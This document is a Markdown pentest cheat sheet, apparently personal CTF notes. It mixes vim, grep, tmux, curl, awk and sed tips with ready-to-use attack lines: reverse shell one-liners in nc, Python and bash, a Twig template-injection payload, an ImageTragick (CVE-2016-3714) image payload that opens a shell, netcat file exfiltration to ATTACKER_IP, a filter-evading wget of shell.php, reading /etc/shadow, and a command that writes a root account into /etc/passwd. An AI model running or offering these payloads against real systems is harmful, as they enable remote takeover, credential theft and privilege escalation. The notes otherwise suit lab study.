[back](../README.md)
# reverse shells
```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.22.27 4444 >/tmp/f
```

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.27",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.27",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

```bash
bash -i >& /dev/tcp/10.18.22.27/4444 0>&1
sh -i >& /dev/tcp/10.10.14.74/4444 0>&1
```

```js
{{this.controller.getTwig().registerUndefinedFilterCallback("passthru")}}
{{ this.controller.getTwig().getFilter("bash -c 'bash -i >& /dev/tcp/10.127.255.241/4455 0>&1'") }}
```

# vim
```vim
Shift+H     # Move cursor to the top of the screen.
Shift+M     # Move cursor to the middle of the screen.
Shift+L     # Move cursor to the bottom of the screen.
gj          # Move one line down if text is within one line.
g0          # Move cursor to the start of the current line.
dk          # Delete current line and the line above it.
gq q        # Format selected text into a single block of multiple lines (VAPGQ).
J           # Join lines together (opposite of GQ).
gj          # Join lines without spaces (opposite of J).
gu u        # Convert to lowercase.
gU U        # Convert to uppercase.
~           # Toggle case of current character.
g~ ~        # Toggle case of all characters in the current line.
gf          # Open the file whose name is under the cursor, '^' to go back.
gv          # Return to the previous selection after visual mode.
:g/remove/d
%! grep -v a
```
---
# grep
```sh
locate seclist | grep <what>
grep -Rwi "text"               #  Recursively search for lines
grep -n                        #  show numbers of lines
grep -i                        #  do not care abuot regex
grep -c                        #  how many times
grep linux * -r                #  recursive  in all files
# точка - это любой символ,   -f чтоб точка не считалась любым символом
-v '^#'                        #  begins with
'^$'                           #  пустые строки
-e '^(#|$)'                    #  начинается или с # или с $(пустая строка)
grep -e 'colou?r'              #  ? makes preveous character optional (то есть и может стоять и нет)
grep -w 'root'                 #  only word root, not asdrootas
\grep                          #  unalias
-A5                            #  five line after the math
-B5                            #  before
-C5                            #  before and after
-e '[0-9]{5,6}/tcp' file.txt   #  от 5 до 6 цифр от 0 до 9
-E '[0-9]$'                    #  number at the end of line
-E '\s*'                       #  space or tab 
+                              #  one and more chars
```

---
# tmux
```sh
ctrl b d                                       # сохранить сессию и выйти из нее
cb p                                           # previous window
cb n                                           # next window
cb ,                                           # rename window
cb c                                           # create window
cb w                                           # list windows
tmux new -s [name_of_new_window]
cb :set -g mouse on
```
---
# curl
```sh
-i                                                                              # show response headers
curl a.b/json | js                                                              # show json nicely
-L                                                                              # follow redirects
-o save.html                                                                    # save to output
-v                                                                              # verbose mode
--trace-ascii -                                                                 # MORE verbose
-H "User-agent:"                                                                # remove header
-H "User-agent;"                                                                # set blank header
-d @file https://a.b/file                                                       # POST file
cat file | curl -d @- http://a.b/file                                           # POST file contents
ls -l | curl --data-binary @- http://a.b/file                                   # binary file as is
-T file                                                                         # PUT file
curl -c cookie.txt http://a.b/login                                             # save cookie
curl -b cookie.txt -c cookie.txt http://a.b/ -d u=a                             # send req with cookie
curl -b cookie.txt -c cookie.txt http://a.b/profile                             # send req with cookie
curl https://localhost -k                                                       # ignore ssl cert
curl https://localhost -k -H "Host: a.b"                                        # works with cookies
curl https://localhost --resolve a.b:443:localhost                              # works everywhere
# in debug network menu u can copy request as curl
--http1.0 --http2 --http3
curl -d user=test http://a.b/login --next http://a.b/my-account                 # no limit --next
```
---
# awk
```sh
cat test | awk '{print $1}'
awk '{print $1,$3}'
awk '{print $NF}'                  # print last field
-F ':'                             # set separator
awk '{print $1"\n"$2}'             # \t = tab
awk 'length($0) < 7' /etc/shells
awk '{print substr($0, 4)}' file   # print all but no first 4 chars
```
# sed
```sh
sed 's/find/replace/' file                               # replace finst in line
sed 's/find/replace/g' file                              # replace all in line
sed 's/find//' file                                      # replayce to nothing
sed -i 's/find/replase/' file                            # save to file, no output
sed '/grep_word/s/find/replase/g'                        # grep word in line and replace other word
sed '/word_to_remove/d/g'                                # remove
sed -e 's/find/replase/g' -e 's/find_2/replase_2/g'      # multiple replacement
sed -n '/find/p'                                         # basically grep command
sed -i 's/ *$//' file                                    # remove all spaces at the end of lines
sed -i 's/[[:space:]]*$//' file                          # remove all tabs at the end of lines
sed -i '/^$/d'                                           # remove all empty lines
sed 's/[a-z]/\U&/g' file                                 # to upper case
sed 's/[A-Z]/\L&/g' file                                 # to lower case
```
# File Transfer on `Netcat`

1. To download a file on the remote shell:

```nc
nc ATTACKER_IP ATTACKER_PORT < [file_to_download]
```

2. To receive the file on the attacker machine:

```nc
nc -l ATTACKER_PORT > [output_file_path]
```

---
# magic numbers
png
```
89504E470D0A1A0A
```
gif
```
GIF87a    474946383761
GIF89a    474946383961
```

---
# ssh port forwarding
```sh
ssh -L <my_port>:127.0.0.1:<port_of_remote_host> admin@1.1.1.1
```
# scan rpc port
```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP
```
---
# scan from 1 to 100 ports with nc
```sh
for i in {1..100};do nc $IP $i;echo "";done
```
---
# CVE-2016–3714

```
cat > image.png << EOF
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|/bin/bash -i > /dev/tcp/10.8.50.72/4444 0<&1 2>&1'
pop graphic-context
pop graphic-context
EOF
```
---

# Read file:
```
xxd -r file.txt 
base64 /etc/shadow | base64 -d
ltrace # is a debugging utility in Linux, used to display the calls a userspace application makes to shared libraries.
echo "11 00 34 5f" | xxd -r -p #from bytes to letters

`l\s`: Equivalent to `ls`
`wget${IFS}http://10.8.50.72:8000/shell.php`

cat ./-

file */{.,}* #every type of file in folder
du -b -a | grep 1033 #size of file
sort data.txt | uniq -u #uniq lines

cat .download.dat | xxd -r -p #like strings
```

---
# if command too long
```python
python3 py.py 10.10.13.118 "$(cat revshell.ps1)"
```
---
# Decompress a gzip file:
```sh
gzip -d file.gz
```
---
# Change file without vim or nano
```sh
cat > file << EOF 
....
EOF
```
---

# broken png image
```
xxd thm.jpg | head
printf '\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01' | dd conv=notrunc of=thm.jpg bs=1
```
---
# NFS share
```
showmount -e $IP
mkdir tmp/
sudo mount -t nfs 10.10.104.64: tmp
tree tmp
```
---
# if 2049 port is open (mount)
```
showmount -e $IP
mount -t nfs $IP:/mnt/backups /mnt/loot
```
---
# socat if open port
```python
./socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22
```

---
# create new user in /etc/passwd with root

```
echo "user:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash" > /etc/passwd
```
---

# Transfer files using `scp`:

```
scp backup.zip toor@192.168.122.30:/home/username_of_remote_host
scp -i id_rsa user@$IP:/home/willow/user.jpg . 
```
---
# fix PATH in old ubuntu
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
---
# mount
```sh
sudo apt install nfs-common
showmount -e $IP
sudo mkdir /mnt/nfs                                                              sudo mount -t nfs $IP:/var/failsafe /mnt/nfs 
```
---
# make id rsa ssh
```
ssh-keygen -t rsa -q -f "$HOME/.ssh/id_rsa" -N ""
```
---
# ftp
```
ftp -A $IP #connect anon

prompt off
mget * #download all files
```
---
# mv multiple files
```
mv -t DESTINATION file1 file2 file3
```

---

# run shell as other user
```
sudo -u user bash
```
---


# shells
```
SHELL=/bin/bash script -q /dev/null
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
---
